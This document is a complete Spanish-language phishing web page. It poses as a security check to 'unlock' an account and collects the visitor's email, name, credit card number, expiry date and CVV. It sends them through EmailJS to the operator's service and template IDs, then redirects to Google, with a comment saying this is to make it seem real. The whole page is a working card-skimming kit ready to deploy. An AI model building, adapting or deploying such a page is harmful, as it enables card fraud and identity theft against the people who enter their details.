<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <!-- Librería de EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          // REEMPLAZAR CON TU PUBLIC KEY
          emailjs.init("khxV-eoqC-Gvj4H1a");
       })();
    </script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 22px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 14px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .icon {
            font-size: 40px;
            color: #007bff;
            margin-bottom: 15px;
        }
        .error {
            color: red;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🔒</div>
    <h2>Verificación de Tarjeta</h2>
    <p>Para confirmar tu identidad y liberar tu cuenta, necesitamos verificar una tarjeta de crédito. No se realizará ningún cobro.</p>

    <form id="emailjs-form">
        <div class="form-group">
            <label for="email">Correo Electrónico</label>
            <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required>
        </div>

        <div class="form-group">
            <label for="name">Nombre Completo</label>
            <input type="text" id="name" name="name" placeholder="Nombre y Apellido" required>
        </div>

        <div class="form-group">
            <label for="card_number">Número de Tarjeta</label>
            <input type="text" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" required>
        </div>

        <div style="display: flex; gap: 10px;">
            <div class="form-group" style="flex: 1;">
                <label for="expiry">Vencimiento</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required>
            </div>
            <div class="form-group" style="flex: 1;">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
            </div>
        </div>

        <button type="submit" id="btn-submit">Verificar Ahora</button>
        <div class="error" id="error-msg">Error al enviar. Intentá de nuevo.</div>
    </form>
</div>

<script>
    document.getElementById('emailjs-form').addEventListener('submit', function(event) {
        event.preventDefault();
        
        const btn = document.getElementById('btn-submit');
        const errorMsg = document.getElementById('error-msg');
        
        btn.innerText = 'Procesando...';
        btn.disabled = true;
        errorMsg.style.display = 'none';

        // REEMPLAZAR CON TU SERVICE ID Y TEMPLATE ID
        const serviceID = 'service_n6ayl9a';
        const templateID = 'template_az3ki7d';

        emailjs.sendForm(serviceID, templateID, this)
            .then(() => {
                btn.innerText = '¡Verificado!';
                btn.style.backgroundColor = '#28a745';
                setTimeout(() => {
                    window.location.href = 'https://www.google.com'; // Redirigir a Google para que parezca real
                }, 2000);
            }, (err) => {
                btn.innerText = 'Verificar Ahora';
                btn.disabled = false;
                errorMsg.style.display = 'block';
                console.log(JSON.stringify(err));
            });
    });
</script>

</body>
</html>
